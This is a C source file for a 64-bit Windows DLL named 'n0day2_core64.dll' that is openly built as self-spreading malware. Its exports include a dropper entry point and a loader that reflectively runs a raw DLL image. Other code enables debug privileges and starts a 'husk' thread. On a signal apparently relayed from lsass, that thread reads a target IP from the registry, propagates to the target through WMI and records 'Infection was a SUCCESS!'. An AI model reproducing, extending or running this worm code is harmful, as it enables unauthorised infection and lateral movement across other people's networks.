#include "../CORE32/main.h"

CHAR testing;
BOOL APIENTRY DllMain(	HANDLE	module,
						DWORD	reserved_call,
						LPVOID	reserved)
{	
	//LoadDll64(NULL);

	return TRUE;
}

__declspec(dllexport) VOID __cdecl DrpOEP64(LPVOID dll_raw)
{
	dropper_dll		= FALSE;

	LoadDll64(dll_raw);
}

__declspec(dllexport) VOID __cdecl LoadDll64(LPVOID dll_raw)
{
	ERROR_CODE					status							= 0;

	DWORD						local_pid;
	CHAR						event_name[1024]				= {0};

	// Set the global raw dll
	//BREAK;
	dll_image = dll_raw;

	//BREAK;

	// Resolve our functions
#ifndef DISABLE_CORE_IAT_RESOLVERS
	resolve_local_api64();
#endif

	//DebugEntry64();

	// Initialize the debug interface
#ifdef DEBUG_OUT
	initialize_debug_channel();
	if (dropper_dll == TRUE) {
		DEBUG("+core64[%d]> First instance initialized.", GetCurrentProcessId());
	} else {
		DEBUG("+core64[%d]> CORE64 initialized.", GetCurrentProcessId());
	}
#endif

	// Elevate
#ifdef ELEVATE_CORE64_DEBUG
#ifdef DEBUG_OUT
	DEBUG("+core64[%d]> Loading privileges...", GetCurrentProcessId());
#endif
	status = enable_debug_priv();
	if (status == FALSE) {
#ifdef DEBUG_OUT
		DEBUG("+core64[%d]> Failed to elevate!", GetCurrentProcessId());
#endif
		//FIXME
	}
#endif

#ifdef ENTRY_DEBUG
	DebugEntry64();
#endif

	//Sleep(INFINITE);

	// Create our event instance
	local_pid = GetCurrentProcessId();
	f_itoa(local_pid, event_name, 10);
	CreateEventA(NULL, TRUE, TRUE, (LPCSTR)event_name);

	// Start the thread dispatcher
	thread_dispatcher();

#ifdef DEBUG_OUT
	DEBUG("+core64[%d]> main() terminating successfully", GetCurrentProcessId());
#endif
	
	ExitThread(0);

	return;
}

VOID DebugEntry64(VOID)
{
	QWORD test[1024];
	QWORD entry;
	PDWORD base;

#ifdef DEBUG_OUT
	DEBUG("+core[%d] Going into debugging subroutines!!!", GetCurrentProcessId());
#endif

	thread_webdav_enum();

#ifdef DEBUG_OUT
	DEBUG("+core[%d] DebugEntry64: SLEEPING", GetCurrentProcessId());
#endif
	Sleep(INFINITE);

	base = (PDWORD)GetModuleHandleA("n0day2_core64.dll");

	entry = (QWORD)locate_dll_entry_point(base, "DrpOEP64", base);

	testing = 0x41;

	return;
}

__declspec(dllexport) void __cdecl husk_entry_point()
{
	int				i;
	HANDLE			event_husk_ready;
	struct in_addr	ip_address;
	char			*target_ip;

	__nop;

	//BREAK;

	resolve_local_api64();

	// Setup the critical seg (sync between tftp and husk threads)
	ZeroMemory(&husk_tftp_sync, sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(&husk_tftp_sync);

	// Get our event handler
	event_husk_ready = OpenEventA(EVENT_ALL_ACCESS, TRUE, HUSK_READY_SIGNAL);

#ifdef DEBUG_OUT
	initialize_debug_channel();
	DEBUG("+husk> online.");
#endif
	ResetEvent(event_husk_ready);

	while (TRUE) {
		Sleep(1000); //FIXME

		//DEBUG(">>> [husk] <<< Waiting on GO from [lsass]...");
		WaitForSingleObject(event_husk_ready, INFINITE);
		ResetEvent(event_husk_ready);
		
		// Get our ip address
		ip_address.S_un.S_addr = read_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME);
		target_ip = inet_ntoa(ip_address);

		// Do ops
		Sleep(1000);
#ifdef DEBUG_OUT
		DEBUG("+husk> GO signal received from [lsass]. Target: \t%s", target_ip);
#endif

		if (propagate_through_wmi(target_ip) == FALSE) {
			//DEBUG("!husk> Failed in communicating to remote namespace.");
			Sleep(500);
			create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_TRUE);

			SetEvent(event_husk_ready);
			Sleep(500);			
		} else {
			Sleep(500);
			//DEBUG("+husk> Infection was a SUCCESS!");
			create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_FALSE);
			
			SetEvent(event_husk_ready);
			Sleep(500);			
		}

	}



	Sleep(INFINITE);

	return;
}